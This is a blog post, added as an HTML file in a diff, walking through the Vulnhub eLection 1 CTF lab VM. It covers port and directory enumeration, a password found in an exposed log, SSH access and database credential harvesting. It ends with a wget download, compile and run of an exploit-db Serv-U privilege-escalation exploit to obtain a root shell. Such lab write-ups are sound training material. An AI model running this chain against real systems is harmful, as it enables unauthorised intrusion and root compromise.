@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+
+    <meta name="author" content="Luka Warren">
+    <meta name="description" content="A writeup of Vulnhub&#39;s eLection 1 CTF">
+    <meta name="keywords" content="blog,programming,cybersecurity,pentesting">
+
+    
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="eLection 1 CTF walkthrough"/>
+<meta name="twitter:description" content="A writeup of Vulnhub&#39;s eLection 1 CTF"/>
+
+    <meta property="og:title" content="eLection 1 CTF walkthrough" />
+<meta property="og:description" content="A writeup of Vulnhub&#39;s eLection 1 CTF" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.lukawarren.com/blog/posts/election/" />
+<meta property="article:published_time" content="2020-07-25T09:34:23+01:00" />
+<meta property="article:modified_time" content="2020-07-25T09:34:23+01:00" />
+
+
+    
+      <base href="https://www.lukawarren.com/blog/posts/election/">
+    
+    <title>
+  eLection 1 CTF walkthrough · My blog
+</title>
+
+    
+      <link rel="canonical" href="https://www.lukawarren.com/blog/posts/election/">
+    
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css" integrity="sha384-Bfad6CLCknfcloXFOyFnlgtENryhrpZCe29RTifKEixXQZ38WheV+i/6YWSzkz3V" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+
+    
+      
+      
+      
+	  <link rel="stylesheet" href="https://www.lukawarren.com/blog/css/coder.min.3219ef62ae52679b7a9c19043171c3cd9f523628c2a65f3ef247ee18836bc90b.css" media="screen" />
+    
+
+    
+
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="https://www.lukawarren.com/img/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://www.lukawarren.com/img/favicon-16x16.png" sizes="16x16">
+
+    <meta name="generator" content="Hugo 0.74.3" />
+  </head>
+
+  
+  
+  <body class="colorscheme-light"
+        onload=""
+  >
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://www.lukawarren.com/blog/">
+      My blog
+    </a>
+    
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://www.lukawarren.com/blog/posts/">Posts</a>
+          </li>
+        
+      
+      
+    </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">eLection 1 CTF walkthrough</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fas fa-calendar"></i>
+              <time datetime='2020-07-25T09:34:23&#43;01:00'>
+                July 25, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fas fa-clock"></i>
+              6-minute read
+            </span>
+          </div>
+          
+          
+        </div>
+      </header>
+
+      <div>
+        
+        <p>Another enjoyable CTF, <a href="https://www.vulnhub.com/entry/election-1,503/">eLection: 1</a> promises to be
+an OSCP-like VM with medium level difficulty. It&rsquo;s quite a straightforward box, but nonetheless a good excuse to sharpen your skills.</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>Lets see what ports are open with <code>nmap -T4 -A 192.168.123.132</code>:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-25 10:01 BST
+Nmap scan report for 192.168.123.132
+Host is up (0.00034s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
+|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
+|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+MAC Address: 00:0C:29:24:29:67 (VMware)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+
+</code></pre></div><p>Interesting - OpenSSH 7.6p1 - might there be a vulnerability or two we can use (specifically with regards to enumerating usernames)? We don&rsquo;t need to do so just yet, but I&rsquo;ll keep that in mind.</p>
+<p>Turning to port 80 then, at first, things don&rsquo;t seem too interesting, except that now we know we&rsquo;re dealing with an Ubuntu box:</p>
+<p><img src="https://www.lukawarren.com/blog/img/election/webserver.png" alt="Website screenshot"></p>
+<p>Things get more exciting when we check robots.txt:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">admin
+wordpress
+user
+election
+</code></pre></div><p>The only directory that seems to exist here is /election.</p>
+<p><img src="https://www.lukawarren.com/blog/img/election/website.png" alt="Other website screenshot"></p>
+<p>Running <code>dirb http://192.168.123.132/</code> is also quite enlightening - it would appear that there&rsquo;s also a forbidden <code>/javascript</code> folder, and better yet, <code>/phpmyadmin</code>! Also, <code>/election</code> looks to have its own thing going on:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">---- Scanning URL: http://192.168.123.132/election/ ----
+==&gt; DIRECTORY: http://192.168.123.132/election/admin/                                                                                           
+==&gt; DIRECTORY: http://192.168.123.132/election/data/                                                                                            
++ http://192.168.123.132/election/index.php (CODE:200|SIZE:7003)                                                                                
+==&gt; DIRECTORY: http://192.168.123.132/election/js/                                                                                              
+==&gt; DIRECTORY: http://192.168.123.132/election/languages/                                                                                       
+==&gt; DIRECTORY: http://192.168.123.132/election/lib/                                                                                             
+==&gt; DIRECTORY: http://192.168.123.132/election/media/                                                                                           
+==&gt; DIRECTORY: http://192.168.123.132/election/themes/
+
+---- Entering directory: http://192.168.123.132/election/admin/ ----
+==&gt; DIRECTORY: http://192.168.123.132/election/admin/ajax/                                                                                      
+==&gt; DIRECTORY: http://192.168.123.132/election/admin/components/                                                                                
+==&gt; DIRECTORY: http://192.168.123.132/election/admin/css/                                                                                       
+==&gt; DIRECTORY: http://192.168.123.132/election/admin/img/                                                                                       
+==&gt; DIRECTORY: http://192.168.123.132/election/admin/inc/                                                                                       
++ http://192.168.123.132/election/admin/index.php (CODE:200|SIZE:8964)                                                                          
+==&gt; DIRECTORY: http://192.168.123.132/election/admin/js/                                                                                        
+==&gt; DIRECTORY: http://192.168.123.132/election/admin/logs/                                                                                      
+==&gt; DIRECTORY: http://192.168.123.132/election/admin/plugins/  
+</code></pre></div><p><img src="https://www.lukawarren.com/blog/img/election/phpmyadmin.png" alt="PHPMyAdmin screenshot"></p>
+<p>So far we&rsquo;ve discovered two potential attack vectors:</p>
+<ul>
+<li>PHPMyAdmin</li>
+<li>The election site</li>
+</ul>
+<h1 id="getting-a-foothold">Getting a foothold</h1>
+<p>I&rsquo;ll focus most of my efforts on the election site for now. After reading a few pages, I couldn&rsquo;t help but notice the candidate &ldquo;Love&rdquo; (and the &ldquo;admin1&rdquo; text beneath him - a password maybe?) Wappalyzer tells me the site is running phpMyAdmin 4.6.6, MySQL and PHP.</p>
+<p>We&rsquo;ll want to login of course, but my attempts at guessing admin IDs were thwarted (well, nearly) by a pesky attempt at blocking me.</p>
+<p><img src="https://www.lukawarren.com/blog/img/election/login.png" alt="Login page with 2 attempts left"></p>
+<p>Amusingly however, the way the site&rsquo;s keeping track of this is with a cookie, something all too easy to change, so it looks like we&rsquo;ll be fine.</p>
+<p><img src="https://www.lukawarren.com/blog/img/election/blocked.png" alt="Sessions variables in FireFox"></p>
+<p>Using Burp Suite will let us analyse exactly what&rsquo;s going on, and as we can see, not only is the blocked_num easy to change, but we&rsquo;ve also two POST parameters to mess around with - perhaps for some SQL injection?</p>
+<p><img src="https://www.lukawarren.com/blog/img/election/burp.png" alt="Burp Suite proxy post form"></p>
+<p>The area at the bottom of the main page (&ldquo;Now is Your Turn!&quot;) also had some sort of form. The client-side Javascript refused to submit the request unless the entered string was 5 characters or longer, which I thought was a bit weird.</p>
+<p><img src="https://www.lukawarren.com/blog/img/election/burp2.png" alt="Burp Suite proxy for votinig"></p>
+<h1 id="getting-user">Getting user</h1>
+<p>After a bit of tomfoolery trying all sorts of wacky things, I decided to do what I really should have done before, and check out the folders dirb uncovered. That proved to be a good idea because now we have some really rather juicy information in the form of /election/admin/logs/system.log&hellip;</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
+[2020-04-03 00:13:53] Love added candidate &#39;Love&#39;.
+[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux)
+</code></pre></div><p>PHPMyAdmin isn&rsquo;t going to accept those credentials. Luckily we have something far better - SSH. Surely not?&hellip;</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-46-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ * &#34;If you&#39;ve been waiting for the perfect Kubernetes dev solution for
+   macOS, the wait is over. Learn how to install Microk8s on macOS.&#34;
+
+   https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+74 packages can be updated.
+28 updates are security updates.
+
+Your Hardware Enablement Stack (HWE) is supported until April 2023.
+Last login: Thu Apr  9 23:19:28 2020 from 192.168.1.5
+love@election:~$ cat Desktop/user.txt
+cd38ac698c0d793a5236d01003f692b0
+</code></pre></div><p>Bingo! Kubernetes is instsalled, which could mean something. It turns out that the hash can be cracked easily and means <code>love-1</code>. How interesting.</p>
+<h1 id="the-road-to-root">The road to root</h1>
+<p>Time to find out about what we can do.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">love@election:~$ id
+uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
+love@election:~$ sudo -l
+[sudo] password for love: 
+Sorry, user love may not run sudo on election.
+</code></pre></div><p>Let&rsquo;s not forget we can look at the site&rsquo;s source code too.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">love@election:/var/www/html/election/admin$ cat inc/conn.php 
+&lt;?php
+        error_reporting(0);
+        session_start();
+        $db_host = &#34;localhost&#34;;
+        $db_user = &#34;newuser&#34;;
+        $db_pass = &#34;password&#34;;
+        $db_name = &#34;election&#34;;
+        $connection = mysqli_connect($db_host,$db_user,$db_pass,$db_name);
+        if(!$connection){
+                echo &#34;FATAL ERROR!&#34;;
+                exit();
+        }
+?&gt;
+</code></pre></div><p>After feeling dumb for not bothering to test for weak credentials beforehand (PHPMyAdmin could&rsquo;ve been fun that way), I really wanted to get some more credentials. So by all means, let&rsquo;s connect to this DB and see what we can find&hellip;</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">love@election:/var/www/html/election/admin$ mysql -u newuser -p 
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 81
+Server version: 10.1.44-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
+
+MariaDB [(none)]&gt; use election
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [election]&gt; show tables
+    -&gt; ;
++--------------------+
+| Tables_in_election |
++--------------------+
+| tb_guru            |
+| tb_hakpilih        |
+| tb_kandidat        |
+| tb_level           |
+| tb_panitia         |
+| tb_pengaturan      |
+| tb_polling         |
+| tb_siswa           |
++--------------------+
+8 rows in set (0.00 sec)
+</code></pre></div><p>I won&rsquo;t bore you with the details, but if we look at one table in particular we can have a little fun.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">MariaDB [election]&gt; select * from tb_panitia;
++----+----------+------+-------+----------------------------------+
+| id | no_induk | nama | level | password                         |
++----+----------+------+-------+----------------------------------+
+|  1 | 1234     | Love |     1 | bb113886b0513a9d882e3caa5cd73314 |
++----+----------+------+-------+----------------------------------+
+1 row in set (0.00 sec)
+</code></pre></div><p>Yet again mostly likely an MD5 hash. Of course, if I spoke Indonesian I&rsquo;d happily tell you what <code>no_induk</code> means, and by all means, crack the password if you want, but as we already have user I decided to just soldier on.</p>
+<h1 id="privilege-escalation">Privilege escalation</h1>
+<p>SUID files are always fun to find, so let&rsquo;s see if they&rsquo;re any.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">love@election:~$ find / -perm /4000
+/usr/bin/arping
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/sbin/pppd
+/usr/local/Serv-U/Serv-U
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/xorg/Xorg.wrap
+/bin/fusermount
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/su
+</code></pre></div><p>Straight away this <code>Serv-U</code> certainly sounds promising. A quick Google search told me it was some sort of FTP server, but for our purposes, we need know only one thing - <a href="https://www.exploit-db.com/exploits/47009">that Serv-U versions under 15.1.7 have a local privilege escalation vulnerability</a>!</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">love@election:~$ wget https://www.exploit-db.com/download/47009 -O 47009.c
+--2020-07-25 16:04:16--  https://www.exploit-db.com/download/47009
+Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
+Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 619 [application/txt]
+Saving to: ‘47009.c’
+
+47009.c                              100%[===================================================================&gt;]     619  --.-KB/s    in 0s      
+
+2020-07-25 16:04:16 (128 MB/s) - ‘47009.c’ saved [619/619]
+
+love@election:~$ gcc 47009.c -o ezRoot.o; ./ezRoot.o
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
+opening root shell
+# whoami
+root
+# cat /root/root.txt
+5238feefc4ffe09645d97e9ee49bc3a6
+</code></pre></div><p>Overall a quite enjoyable box, and one I certainly had fun doing (the flag means love-root if anyone&rsquo;s interested). Not too many rabbit holes or anything like that, although I do wonder if there are other ways of completing it, given the remaining mysteries of the election&rsquo;s admin panel.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ['$', '$'], ['\\(', '\\)']
+        ],
+        processEscapes: true,
+        processEnvironments: true
+      },
+      options: {
+        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+      }
+    };
+  </script>
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+        <p><a href='https://www.lukawarren.com/'>Go back to lukawarren.com</a></p>
+      
+      
+        ©
+        
+        2020
+         Luka Warren 
+      
+      
+         · 
+        Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+      
+      
+    </section>
+  </footer>
+
+    </main>
+
+    
+
+    
+
+    
+
+  </body>
+
+</html>
